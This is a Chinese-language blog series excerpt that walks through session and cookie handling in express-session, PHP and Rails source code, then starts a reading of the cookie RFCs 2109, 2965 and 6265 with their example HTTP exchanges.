好，我們再講回來前面，所以 express-session 會把 sessionID 存在 cookie 裡面，key 是 connect.sid，value 則是 s:&#123;sessionID&#125;.&#123;hmac-sha256(sessionID, secret)&#125;。
好奇的話你可以去任何使用 Express 的網站然後看一下 cookie 內容，就可以找到實際的資料（或是自己隨便執行一個也行），這邊我用我的當作範例，我的 connect.sid 是： s%3AfZZVCDHefchle2LDK4PzghaR3Ao9NruG.J%2BsOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM，把特殊字元 decode 之後變成： s:fZZVCDHefchle2LDK4PzghaR3Ao9NruG.J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。
也就是說我的 sessionID 是fZZVCDHefchle2LDK4PzghaR3Ao9NruG，鑑別碼是J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。
知道儲存 sessionID 的方式以後，從 cookie 裡面取得 sessionID 的方式應該也能看懂，就是把事情反過來做而已：
// get the session ID from the cookievar cookieId = req.sessionID = getcookie(req, name, secrets);  function getcookie(req, name, secrets) &#123;  var header = req.headers.cookie;  var raw;  var val;    // read from cookie header  if (header) &#123;    var cookies = cookie.parse(header);      raw = cookies[name];      if (raw) &#123;      if (raw.substr(0, 2) === &#x27;s:&#x27;) &#123;        val = unsigncookie(raw.slice(2), secrets);        if (val === false) &#123;          debug(&#x27;cookie signature invalid&#x27;);          val = undefined;        &#125;      &#125; else &#123;        debug(&#x27;cookie unsigned&#x27;)      &#125;    &#125;  &#125;    return val;&#125;  /** * Verify and decode the given `val` with `secrets`. * * @param &#123;String&#125; val * @param &#123;Array&#125; secrets * @returns &#123;String|Boolean&#125; * @private */function unsigncookie(val, secrets) &#123;  for (var i = 0; i &lt; secrets.length; i++) &#123;    var result = signature.unsign(val, secrets[i]);      if (result !== false) &#123;      return result;    &#125;  &#125;    return false;&#125;

接下來就剩最後一個了，session 資訊到底存在哪裡？是存在記憶體、檔案，還是其他地方？
其實這個在程式碼裡面寫得很清楚了，預設是存在記憶體裡面的：
var warning = &#x27;Warning: connect.session() MemoryStore is not\n&#x27;  + &#x27;designed for a production environment, as it will leak\n&#x27;  + &#x27;memory, and will not scale past a single process.&#x27;;  // get the session storevar store = opts.store || new MemoryStore()  // notify user that this store is not// meant for a production environment/* istanbul ignore next: not tested */if (env === &#x27;production&#x27; &amp;&amp; store instanceof MemoryStore) &#123;  console.warn(warning);&#125;

那到底是怎麼存呢？可以參考 session&#x2F;memory.js：
function MemoryStore() &#123;  Store.call(this)  this.sessions = Object.create(null)&#125;  MemoryStore.prototype.get = function get(sessionId, callback) &#123;  defer(callback, null, getSession.call(this, sessionId))&#125;  MemoryStore.prototype.set = function set(sessionId, session, callback) &#123;  this.sessions[sessionId] = JSON.stringify(session)  callback &amp;&amp; defer(callback)&#125;  function getSession(sessionId) &#123;  var sess = this.sessions[sessionId]    if (!sess) &#123;    return  &#125;    // parse  sess = JSON.parse(sess)    return sess&#125;

首先用 Object.create(null) 創造出一個乾淨的 Object（這是很常用的一個方法，沒看過的可以參考：詳解 Object.create(null)），然後以 sessionID 作為 key，JSON.stringigy(session)作為 value，存到這個 object 裡面。
所以說穿了其實 express-session 的 session information 預設就是存在一個變數裡面而已啦，因此你只要一把 process 結束掉重開，session 的資料就都全部不見了。而且會有 memory leak 的問題，所以官方也不推薦用在 production 上面。
如果要用在 production 上面，必須額外再找store來用，例如說 connect-redis 就可以跟 express-session 搭配，把 session information 存在 redis 裡。
以上就是 Express 常用的 middleware：express-session 的原始碼分析。從上面的段落我們清楚知道了 sessionID 的產生方式以及如何存在 cookie，還有 session information 所儲存的地方。
PHP（7.2 版本）PHP 內建就有 session 機制，不必使用任何的 framework，而使用的方法也很簡單：
&lt;?phpsession_start();  if (empty($_SESSION[&#x27;views&#x27;])) &#123;    $_SESSION[&#x27;views&#x27;] = 1;&#125; else &#123;    $_SESSION[&#x27;views&#x27;]++;&#125;  echo $_SESSION[&#x27;views&#x27;];?&gt;

其實跟 express-session 的用法有點像，只是一個是 req.session，一個是$_SESSION。
我原本也想跟剛剛看 express-session 一樣，直接去看 PHP 的原始碼，然後從中發現如何實作。但因為 PHP 的原始碼全部都是 C，對我這種幾乎沒寫過 C 的人來說很難看懂，因此我也只能反過來。先跟大家介紹 PHP 的 Session 機制是如何實作的，再從原始碼裡面去找證據支援。
首先呢，PHP 的 Session 機制與 express-session 差不多，都會在 Cookie 裡存放一個 sessionID，並且把 session information 存在伺服器。express-session 預設是存在記憶體，PHP 預設則是存在檔案裡面。
以上這些都可以在 PHP 的設定檔調整，都寫在 php.ini 裡面，底下以我的為例，列出一些相關的設定：
[Session]; Handler used to store/retrieve data.; http://php.net/session.save-handlersession.save_handler=files  ; Argument passed to save_handler.  In the case of files, this is the path; where data files are stored. Note: Windows users have to change this; variable in order to use PHP&#x27;s session functions.;; The path can be defined as:;;     session.save_path = &quot;N;/path&quot;  session.save_path=&quot;/opt/lampp/temp/&quot;  ; Name of the session (used as cookie name).; http://php.net/session.namesession.name=PHPSESSID  ; Handler used to serialize data.  php is the standard serializer of PHP.; http://php.net/session.serialize-handlersession.serialize_handler=php

在 Cookie 裡面你就能看見一個 PHPSESSID，值大概長得像這樣：fc46356f83dcf5712205d78c51b47c4d，這就是 PHP 所使用的 sessionID。
接著你去 session.save_path 看，就會看到儲存你 session 資訊的檔案，檔名很好認，就是 sess_ 加上 sessionID：
root@debian:/opt/lampp/temp# ls  adminer.invalidadminer.versionsess_04719a35fb67786d574ec6eca969f7cbsess_fc46356f83dcf5712205d78c51b47c4d

若是打開 session 檔案，內容會是被序列化（serialize）之後的結果：
views|i:5;

這就是 PHP session 的真面目了。把 session information 全都存在檔案裡面。
若是想要研究 PHP session 的相關原始碼，最重要的檔案就是這兩個：ext&#x2F;session&#x2F;session.c 跟 ext&#x2F;session&#x2F;mod_files.c，前者管理 session 生命週期，後者負責把 session 實際存到檔案裡面或者是讀出來。後者其實就很像我們在 express-session 裡面看到的 Store，只要遵守一樣的 interface，就可以自己寫一個其他的 mod 出來，例如說 mod_redis.c 之類的。
接著我們一樣先來找找看 sessionID 是如何產生的，可以直接在 mod_files.c 搜尋相關字眼，就會找到底下這段：
/* * Create session ID. * PARAMETERS: PS_CREATE_SID_ARGS in php_session.h * RETURN VALUE: Valid session ID(zend_string *) or NULL for FAILURE. * * PS_CREATE_SID_FUNC() must check collision. i.e. Check session data if * new sid exists already. * *mod_data is guaranteed to have non-NULL value. * NOTE: Default php_session_create_id() does not check collision. If * NULL is returned, session module create new ID by using php_session_create_id(). * If php_session_create_id() fails due to invalid configuration, it raises E_ERROR. * NULL return value checks from php_session_create_id() is not required generally. */PS_CREATE_SID_FUNC(files)&#123;    zend_string *sid;    int maxfail = 3;    PS_FILES_DATA;      do &#123;        sid = php_session_create_id((void**)&amp;data);        if (!sid) &#123;            if (--maxfail &lt; 0) &#123;                return NULL;            &#125; else &#123;                continue;            &#125;        &#125;        /* Check collision */        /* FIXME: mod_data(data) should not be NULL (User handler could be NULL) */        if (data &amp;&amp; ps_files_key_exists(data, ZSTR_VAL(sid)) == SUCCESS) &#123;            if (sid) &#123;                zend_string_release(sid);                sid = NULL;            &#125;            if (--maxfail &lt; 0) &#123;                return NULL;            &#125;        &#125;    &#125; while(!sid);      return sid;&#125;

這邊呼叫了 php_session_create_id 來產生 sessionID，然後會檢查有沒有產生重複的 id，有的話就重試最多三次。而 php_session_create_id 則是存在於 session.c 那個檔案：
#define PS_EXTRA_RAND_BYTES 60  PHPAPI zend_string *php_session_create_id(PS_CREATE_SID_ARGS) /* &#123;&#123;&#123; */&#123;    unsigned char rbuf[PS_MAX_SID_LENGTH + PS_EXTRA_RAND_BYTES];    zend_string *outid;      /* Read additional PS_EXTRA_RAND_BYTES just in case CSPRNG is not safe enough */    if (php_random_bytes_throw(rbuf, PS(sid_length) + PS_EXTRA_RAND_BYTES) == FAILURE) &#123;        return NULL;    &#125;      outid = zend_string_alloc(PS(sid_length), 0);    ZSTR_LEN(outid) = bin_to_readable(rbuf, PS(sid_length), ZSTR_VAL(outid), (char)PS(sid_bits_per_character));      return outid;&#125;

重點其實只有這一個：php_random_bytes_throw，這個 function 如果繼續追下去會找到 ext&#x2F;standard&#x2F;php_random.h，然後找到 ext&#x2F;standard&#x2F;random.c，才是真正產生隨機數的地方。
但最後找到的那個 function 想要看懂必須花一大段時間，因此我就沒有細看了。總之在不同作業系統上會有不同的產生方式，其中一種還會使用到 &#x2F;dev&#x2F;urandom。
知道了 sessionID 的產生方式以後，我們來看看 PHP 的 session information 是怎麼做 serialize 的。可以在官方文件上看到一個 function 叫做：session_encode，輸出的結果跟我們在 session 檔案裡面看到的資料一模一樣，而這個 function 的敘述寫著：

session_encode() returns a serialized string of the contents of the current session data stored in the $_SESSION superglobal.


By default, the serialization method used is internal to PHP, and is not the same as serialize(). The serialization method can be set using session.serialize_handler.

接著我們直接在 session.c 裡面搜尋session_encode，會找到這一段：
/* &#123;&#123;&#123; proto string session_encode(void)   Serializes the current setup and returns the serialized representation */static PHP_FUNCTION(session_encode)&#123;    zend_string *enc;      if (zend_parse_parameters_none() == FAILURE) &#123;        return;    &#125;      enc = php_session_encode();    if (enc == NULL) &#123;        RETURN_FALSE;    &#125;      RETURN_STR(enc);&#125;

只是一個 php_session_encode 的 wrapper 而已，而且 php_session_encode 也只是再呼叫別的東西：
static zend_string *php_session_encode(void) /* &#123;&#123;&#123; */&#123;    IF_SESSION_VARS() &#123;        if (!PS(serializer)) &#123;            php_error_docref(NULL, E_WARNING, &quot;Unknown session.serialize_handler. Failed to encode session object&quot;);            return NULL;        &#125;        return PS(serializer)-&gt;encode();    &#125; else &#123;        php_error_docref(NULL, E_WARNING, &quot;Cannot encode non-existent session&quot;);    &#125;    return NULL;&#125;/* &#125;&#125;&#125; */

return PS(serializer)-&gt;encode(); 這一句才是重點。其實追到這邊的時候就有點卡住，因為不清楚這邊的 serializer 是從哪邊來的。但往下稍微看一下程式碼，找到一段應該是相關的：
#define PS_DELIMITER &#x27;|&#x27;  PS_SERIALIZER_ENCODE_FUNC(php) /* &#123;&#123;&#123; */&#123;    smart_str buf = &#123;0&#125;;    php_serialize_data_t var_hash;    PS_ENCODE_VARS;      PHP_VAR_SERIALIZE_INIT(var_hash);      PS_ENCODE_LOOP(        smart_str_appendl(&amp;buf, ZSTR_VAL(key), ZSTR_LEN(key));        if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) &#123;            PHP_VAR_SERIALIZE_DESTROY(var_hash);            smart_str_free(&amp;buf);            return NULL;        &#125;        smart_str_appendc(&amp;buf, PS_DELIMITER);        php_var_serialize(&amp;buf, struc, &amp;var_hash);    );      smart_str_0(&amp;buf);      PHP_VAR_SERIALIZE_DESTROY(var_hash);    return buf.s;&#125;/* &#125;&#125;&#125; */

會知道相關是因為 #define PS_DELIMITER &#39;|&#39; 這一行，這個符號在 session 檔案裡有出現，可以猜測應該是拿來分隔什麼東西的。而實際的值則是交給php_var_serialize處理。
php_var_serialize若是繼續往下追，可以找到 ext&#x2F;standard&#x2F;var.c（直接用 GitHub 搜尋功能就可以找到這個檔案，搜尋功能超方便的），最後就會找到真正在處理的地方：php_var_serialize_intern，裡面會針對不同的形態去呼叫不同的 function。
以我們之前存在 session 裡面的 views 來說，是一個數字，所以會跑到這個 function：
static inline void php_var_serialize_long(smart_str *buf, zend_long val) /* &#123;&#123;&#123; */&#123;    smart_str_appendl(buf, &quot;i:&quot;, 2);    smart_str_append_long(buf, val);    smart_str_appendc(buf, &#x27;;&#x27;);&#125;/* &#125;&#125;&#125; */

追到這邊，就知道為什麼當初 session 序列化之後的結果是views|i:5;了。|拿來分隔 key 跟 value，i 代表著型態，5 代表實際的數字，; 則是結束符號。
以上就是 PHP Session 機制的相關原始碼分析，我們稍微看了如何產生 sessionID 以及 session information 如何做序列化。也知道了以預設的狀態來說，cookie 名稱會叫做 PHPSESSID，而且會以檔案的方式來儲存 session 的內容。
最後來分享兩個跟 PHP Session 有關的文章，都十分有趣：

HITCON CTF 2018 - One Line PHP Challenge
[Web Security] 透過 LFI 引入 PHP session 檔案觸發 RCE

Rails（5.2 版本）Rails 是一個 Ruby 的 Web 框架，俗稱 Ruby on Rails。會挑這一套是因為我本來就知道它儲存 session 的方法不太一樣。我當初只是好奇 Rails 怎麼生成 sessionID 的，於是就去 GitHub 的 repo 搜尋：session，然後找到這個檔案：rails&#x2F;actionpack&#x2F;test&#x2F;dispatch&#x2F;session&#x2F;cookie_store_test.rb，是個測試，但有時候測試其實對找程式碼幫助也很大，因為裡面會出現一堆相關的 function 跟參數。
我那時觀察了一陣子，發現裡面出現了很多次的 session_id，於是就改用這個關鍵字搜尋，找到了 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb，發現裡面的註解把 Rails 的 Session 實作方式寫得一清二楚：
# This cookie-based session store is the Rails default. It is# dramatically faster than the alternatives.## Sessions typically contain at most a user_id and flash message; both fit# within the 4K cookie size limit. A CookieOverflow exception is raised if# you attempt to store more than 4K of data.## The cookie jar used for storage is automatically configured to be the# best possible option given your application&#x27;s configuration.## If you only have secret_token set, your cookies will be signed, but# not encrypted. This means a user cannot alter their +user_id+ without# knowing your app&#x27;s secret key, but can easily read their +user_id+. This# was the default for Rails 3 apps.## Your cookies will be encrypted using your apps secret_key_base. This# goes a step further than signed cookies in that encrypted cookies cannot# be altered or read by users. This is the default starting in Rails 4.## Configure your session store in &lt;tt&gt;config/initializers/session_store.rb&lt;/tt&gt;:##   Rails.application.config.session_store :cookie_store, key: &#x27;_your_app_session&#x27;## In the development and test environments your application&#x27;s secret key base is# generated by Rails and stored in a temporary file in &lt;tt&gt;tmp/development_secret.txt&lt;/tt&gt;.# In all other environments, it is stored encrypted in the# &lt;tt&gt;config/credentials.yml.enc&lt;/tt&gt; file.## If your application was not updated to Rails 5.2 defaults, the secret_key_base# will be found in the old &lt;tt&gt;config/secrets.yml&lt;/tt&gt; file.## Note that changing your secret_key_base will invalidate all existing session.# Additionally, you should take care to make sure you are not relying on the# ability to decode signed cookies generated by your app in external# applications or JavaScript before changing it.## Because CookieStore extends Rack::Session::Abstract::Persisted, many of the# options described there can be used to customize the session cookie that# is generated. For example:##   Rails.application.config.session_store :cookie_store, expire_after: 14.days## would set the session cookie to expire automatically 14 days after creation.# Other useful options include &lt;tt&gt;:key&lt;/tt&gt;, &lt;tt&gt;:secure&lt;/tt&gt; and# &lt;tt&gt;:httponly&lt;/tt&gt;.

Rails 預設使用 cookie-based session，因為它比其他解決方案都來得快。雖然 cookie 有大小限制，但頂多只會存 flash message 跟 user_id，離 4k 的上限還有一大段距離。
在 Rails 3 裡面 cookie 只會被 signed 不會被加密，意思就是使用者看得到 user_id 但沒辦法改它（就像我們在 express-session 看到的 sessionID 一樣，看得到但不能改）。
而 Rails 4 以後預設就會把 cookie 的值整個加密，什麼都看不到。在測試環境時 Rails 會自動幫你產生一個 secret 來加密，也可以透過 Rails 的設定檔來設定。
在這份檔案中也可以看到有一個 function 叫做generate_sid，是拿來產生 sessionID 的。這個 function 存在於 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;abstract_store.rb：
def generate_sid    sid = SecureRandom.hex(16)    sid.encode!(Encoding::UTF_8)    sidend

直接呼叫了 Ruby 的函式庫 SecureRandom 來產生亂數並當作 sessionID。
至於在 Cookie 裡面的 key 是什麼，可以經由設定 app.config.session_store 來調整。根據這邊的程式碼：
# Setup default session store if not already set in config/application.rbinitializer :setup_default_session_store, before: :build_middleware_stack do |app|    unless app.config.session_store?        app_name = app.class.name ? app.railtie_name.chomp(&quot;_application&quot;) : &quot;&quot;        app.config.session_store :cookie_store, key: &quot;_#&#123;app_name&#125;_session&quot;    endend

預設值會是 _#&#123;app_name&#125;_session，例如說我的 app_name 叫做 huli，Cookie 名稱就會是 _huli_session。
然後把 session information 實際寫進去 cookie 的地方在 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb：
def set_cookie(request, session_id, cookie)  cookie_jar(request)[@key] = cookieenddef get_cookie(req)  cookie_jar(req)[@key]enddef cookie_jar(request)  request.cookie_jar.signed_or_encryptedend

會呼叫與 cookie 相關的 signed_or_encrypted 來做處理。
接著我去搜了一下文件，發現其實官方文件都寫得十分清楚了：

The session ID is generated using SecureRandom.hex which generates a random hex string using platform specific methods (such as OpenSSL, &#x2F;dev&#x2F;urandom or Win32 CryptoAPI) for generating cryptographically secure random numbers. Currently it is not feasible to brute-force Rails’ session IDs.

上面這段寫了 sessionID 的產生方式。

The CookieStore uses the encrypted cookie jar to provide a secure, encrypted location to store session data. Cookie-based sessions thus provide both integrity as well as confidentiality to their contents. The encryption key, as well as the verification key used for signed cookies, is derived from the secret_key_base configuration value.
As of Rails 5.2 encrypted cookies and sessions are protected using AES GCM encryption. This form of encryption is a type of Authenticated Encryption and couples authentication and encryption in single step while also producing shorter ciphertexts as compared to other algorithms previously used. The key for cookies encrypted with AES GCM are derived using a salt value defined by the config.action_dispatch.authenticated_encrypted_cookie_salt configuration value.

這段則是寫說從 Rails 5.2 開始採用 AES GCM 來加密，底下還有一個段落我沒複製，主要是提到之前程式碼註解裡面寫的，Rails 4 前只用 HMAC 來做驗證，而不是加密。
而且我看一看之後發現這文件寫的好棒喔，除了把這些機制說明清楚以外，底下還介紹了我們上一篇提到的 Session Fixation Attack 以及 CSRF。
若是還想深入研究，可以參考 Rails 裡面 Cookie 相關的實作：rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;cookies.rb，註解裡面有詳細的說明，例如說加密的部分：
# Returns a jar that&#x27;ll automatically encrypt cookie values before sending them to the client and will decrypt them for read.# If the cookie was tampered with by the user (or a 3rd party), +nil+ will be returned.#  # If +secret_key_base+ and +secrets.secret_token+ (deprecated) are both set,# legacy cookies signed with the old key generator will be transparently upgraded.#  # If +config.action_dispatch.encrypted_cookie_salt+ and +config.action_dispatch.encrypted_signed_cookie_salt+# are both set, legacy cookies encrypted with HMAC AES-256-CBC will be transparently upgraded.#  # This jar requires that you set a suitable secret for the verification on your app&#x27;s +secret_key_base+.#  # Example:#  #   cookies.encrypted[:discount] = 45#   # =&gt; Set-Cookie: discount=DIQ7fw==--K3n//8vvnSbGq9dA--7Xh91HfLpwzbj1czhBiwOg==; path=/#  #   cookies.encrypted[:discount] # =&gt; 45def encrypted  @encrypted ||= EncryptedKeyRotatingCookieJar.new(self)end

往底下追的話就可以看到 EncryptedKeyRotatingCookieJar 的完整程式碼，或你也可以再往下，看看 rails&#x2F;activesupport&#x2F;lib&#x2F;active_support&#x2F;message_encryptor.rb，負責加密的程式碼長這樣：
def _encrypt(value, **metadata_options)    cipher = new_cipher    cipher.encrypt    cipher.key = @secret      # Rely on OpenSSL for the initialization vector    iv = cipher.random_iv    cipher.auth_data = &quot;&quot; if aead_mode?      encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options))    encrypted_data &lt;&lt; cipher.final      blob = &quot;#&#123;::Base64.strict_encode64 encrypted_data&#125;--#&#123;::Base64.strict_encode64 iv&#125;&quot;    blob = &quot;#&#123;blob&#125;--#&#123;::Base64.strict_encode64 cipher.auth_tag&#125;&quot; if aead_mode?    blobend

這裡的 cipher 是從 openssl 來的，所以最底層是使用了 openssl。
整理到這邊應該就差不多了，就不再繼續深入了。
總結在這篇裡面我們看了三個不同的 Session 儲存方式。第一種是 express-session，把 session information 存在記憶體裡面；第二種是 PHP，存在檔案裡面；最後一種則是 Rails，採用了之前提過的 cookie-based session，將資訊直接加密並且存在 cookie 裡。
在這系列當中，第一篇文章我們理解了概念，第二篇利用讀 RFC 加深印象並重新理解了一次 Session，最後一篇則是直接參考一些主流框架的實作，看看我們之前所提到的 sessionID 應該如何產生，session information 應該存在哪裡，cookie-bases session 又應該如何實作。
寫這系列的初衷就是想讓大家把這些概念一次理解清楚，就不用以後每次碰到都重新查一遍。
最後，希望這系列對大家有幫助，有任何錯誤都可以在底下留言反映。
底下是系列文的完整清單：

白話 Session 與 Cookie：從經營雜貨店開始
淺談 Session 與 Cookie：一起來讀 RFC
深入 Session 與 Cookie：Express、PHP 與 Rails 的實作

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>web</tag>
        <tag>cookie</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>淺談 Session 與 Cookie：一起來讀 RFC</title>
    <url>/2019/08/10/session-and-cookie-rfc/</url>
    <content><![CDATA[前言這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的第二篇，三篇的完整連結如下：

白話 Session 與 Cookie：從經營雜貨店開始
淺談 Session 與 Cookie：一起來讀 RFC
深入 Session 與 Cookie：Express、PHP 與 Rails 的實作

在上一篇裡面，我們提到了 Session 的意思：

Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。在故事裡面我們用了紙條跟手機裡的資訊來比喻，有多種方式可以達成 Session。

其實在寫這系列的時候，「Session 最明確的定義是什麼」困擾了我一陣子，而且我到現在還不能完全肯定到底怎樣才是對的。在我心中有兩個解釋都滿合理的，第一個解釋就是上一篇跟大家講的，Session 是一種讓 Request 變成 stateful 的「機制」，而 Session 的第二種解釋（也是比較貼近英文原文的解釋），就是「具有狀態的一段期間」，或者是「上下文」，所以在 Session 裡面的東西可以放在一起看。
有一種說法認為 Session 的原意的確是第二種，但是在 Web 領域中 Session 轉變成了一種「機制」，所以兩個意思都通。但我自己其實是比較傾向第二種才是唯一正確的解釋方法，從頭到尾第二種都是對的，第一種則是誤解。
舉個例子來說，如果你有用過 Google Analytics，裡面有個名詞叫做「工作階段」，英文原名就叫做 Session，而 Google 對 Session 的解釋是這樣的：

（來源：Analytics (分析) 定義網頁工作階段的方式）
它把 Session 定義為「指定期間內在網站上發生的多項使用者互動」，並且說可以把 Session 當作一個容器（Container）。雖然說 Google Analytics 的 Session 跟 Web 技術上所使用的 Session 本來就不同，但我認為多少可以互相參考。而這個 Session 的定義與我前面所說的「具有狀態的一段期間」或者是「上下文」其實是雷同的。
那為什麼儘管我比較偏向這個定義，卻在上一篇裡面隻字不提，還把 Session 定義成我眼中的「誤解」？
第一個原因是搞不好兩種解釋都說得通，所以有可能兩個都是對的。第二個原因是我所認為的 Session 精確定義非常不好解釋，因為概念太抽象了。我認為若是提了這個解釋，只會把你對 Session 的理解越搞越亂，因此上一篇才沒有提到這個。第三個原因是我認為解釋成機制也可以，而且比較好理解，就算它真的是錯誤的，造成的影響也沒那麼大。
總之呢，我認為對完全沒有基礎的人來說，把 Session 理解成一種機制就可以了。但是對於像我這種想要追根究底的人來說，我想知道的是最正確的理解，而且必須是有憑有據的。
要怎樣才叫做有憑有據呢？去看當年談論 Cookie 與 Session 的 RFC 文件應該夠有憑有據了吧？RFC 文件可是要經歷過一系列討論與審核之後才能誕生，我想不到有哪邊的解釋能比 RFC 更具有說服力。
在這篇文章中我們會來稍微讀一下三份 RFC：

RFC 2109
RFC 2965
RFC 6265

為什麼要讀三份呢？因為這三份都是跟 Cookie 相關的文件，2109 是最早的一份，後來出現一些問題所以被新的 2965 取代，過了十年後有了 6265，是目前最新的標準。
我認為讀東西從最早期的時候開始讀能夠事半功倍，因為東西應該會最少，理解上也比較容易，找資料也好找。例如說要讀 React 原始碼我會推薦從最早的 0.xx 版本開始讀，讀 ECMAScript 也可以從 ES3 開始，還可以順便知道演進的過程。
前情提要大概就到這邊了，本文的目標就是來讀 RFC，看看裡面是怎麼說 Cookie 與 Session 的。裡面我會對原文做一些翻譯，但畢竟翻譯是項專業，我翻的很差而且一定有錯誤，拜託大家還是要看原文，翻譯只能當作輔助。如果有哪邊錯的很離譜歡迎指出，我會十分感謝。
RFC 2109RFC 2109 發佈於 1997 年 2 月，那是個還沒有 Ajax 的年代，是個 Netscape 還稱霸瀏覽器市場的年代。
這份文件的標題叫做：「HTTP State Management Mechanism」，直翻就是 HTTP 狀態管理機制。
先來看摘要的部分：

This document specifies a way to create a stateful session with HTTP requests and responses.  It describes two new headers, Cookie and Set-Cookie, which carry state information between participating origin servers and user agents.  The method described here differs from Netscape’s Cookie proposal, but it can interoperate with HTTP&#x2F;1.0 user agents that use Netscape’s method.  (See the HISTORICAL section.)
這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法，並介紹了兩個新的 header：Cookie 跟 Set-Cookie，藉由這兩個 header 在 server 與 user agent（通常就是指瀏覽器）之間傳遞資訊。這邊所提到的方法與 Netscape 的 Cookie 提案不同，但可以互相兼容。

（每次翻譯翻一翻就會不想翻了…因為總覺得自己翻譯得不夠精確，翻譯真滴難）
摘要寫得很明確了，簡單來說就是引入 Cookie 與 Set-Cookie 兩個 Header 來建立 Session。會特別提到 Netscape 是因為 Cookie 這東西最早是 Netscape 自己實作的，只可惜我能找到的連結都死掉了，無緣看到 Netscape 的 Cookie 規範長什麼樣子。
再來第二個部分 TERMINOLOGY 就是規定一些專有名詞的用法，可以稍微掃過去就好，重點在第三個部分 STATE AND SESSIONS：

This document describes a way to create stateful sessions with HTTP requests and responses.  Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a “session”.  
這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法。目前 HTTP 伺服器獨立回應每一個 Request，不把它與其他 Request 關聯，而這個方法允許想要交換狀態資訊的 Server 與 Client 把 HTTP Request 與 Response 放在一個更大的 context 底下，我們稱之為一個 session。（這段我覺得超級難翻…而且一定翻得不好）


This context might be used to create, for example, a “shopping cart”, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a user’s previous reading affects which offerings are presented.
舉例來說，這個 context 可以用來建立購物車的功能，在購買前可以知道使用者選了哪些物品，或者是雜誌瀏覽系統，從以前讀過的東西推薦可能喜歡的內容。

這邊對於 Session 的定義就如同我前面所講的那樣，Session 是「具有狀態的一段期間」，或者是「上下文」，就是上面所提到的 context，在這個 context 裡面的 Request 與 Response 可以放在一起看，於是他們之間就有了狀態。

There are, of course, many different potential contexts and thus many different potential types of session.  The designers’ paradigm for sessions created by the exchange of cookies has these key attributes:

Each session has a beginning and an end.
Each session is relatively short-lived.
Either the user agent or the origin server may terminate a session.
The session is implicit in the exchange of state information.

有很多種不同型態的 session，而藉由交換 cookie 所建立的 session 有幾個重點：

每個 session 都有開始與結束
每個 session 都是相對短暫的
瀏覽器或伺服器任何一方都可以終止這個 session
Session 蘊含了交換狀態資訊的概念在裡面


這邊就是稍微介紹了一下 Session 的特性而已。若是我們把 Session 理解為是一種「機制」，那該如何解釋上面的段落？「每個 Session 機制都是相對短暫的」？，聽起來有點怪怪的，所以這也是為什麼我會說 Session 當作機制來解有一點奇怪。
接下來第四個章節很多部分都是在講那些 Header 的規格，這邊我們跳過不看，只節選幾個我認為比較重要的段落出來：

4.2.1  General
The origin server initiates a session, if it so desires. (…) &gt;To initiate a session, the origin server returns an extra response header to the client, Set-Cookie.  (The details follow later.)
A user agent returns a Cookie request header (see below) to the origin server if it chooses to continue a session.


如果 Server 需要的話，它可以初始化一個 session，而初始化的方法是回傳一個 Set-Cookie 的 Header，若是瀏覽器決定繼續這個 session 的話，可以回傳 Cookie 這個 Header

簡單來說就是你把伺服器把狀態放在 Set-Cookie 這個 Header 裡面送去瀏覽器，而瀏覽器在之後的 Request 把 Cookie 帶上去，這樣子就成立一個 Session 了，因為後續的 Request 就有了狀態。
再來可以看一下第五個章節 EXAMPLES 的部分，我們來看其中一個例子，這邊的例子比較簡單，我就直接翻中文了，想看原文可以到這裡：5.1 Example 1。
第一步：瀏覽器 -&gt; 伺服器POST /acme/login HTTP/1.1[form data]

使用者透過表單登入。
第二步：伺服器 -&gt; 瀏覽器HTTP/1.1 200 OKSet-Cookie: Customer=&quot;WILE_E_COYOTE&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

登入成功，伺服器發送 Set-Cookie Header 並設置資訊，儲存了使用者的身份。
第三步：瀏覽器 -&gt; 伺服器POST /acme/pickitem HTTP/1.1Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;[form data]

使用者把某個物品加入購物車。
第四步：伺服器 -&gt; 瀏覽器HTTP/1.1 200 OKSet-Cookie: Part_Number=&quot;Rocket_Launcher_0001&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

伺服器再設置一個 Cookie 來儲存剛剛加入購物車的東西。
第五步：瀏覽器 -&gt; 伺服器POST /acme/shipping HTTP/1.1Cookie: $Version=&quot;1&quot;;  Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;;  Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot;  [form data]

使用者利用表單選擇商品的運送方式。
第六步：伺服器 -&gt; 瀏覽器HTTP/1.1 200 OKSet-Cookie: Shipping=&quot;FedEx&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

設置新的 Cookie 來儲存運送方式。
第七步：瀏覽器 -&gt; 伺服器POST /acme/process HTTP/1.1Cookie: $Version=&quot;1&quot;;  Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;;  Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot; Shipping=&quot;FedEx&quot;; $Path=&quot;/acme&quot; [form data]

使用者選擇結帳。
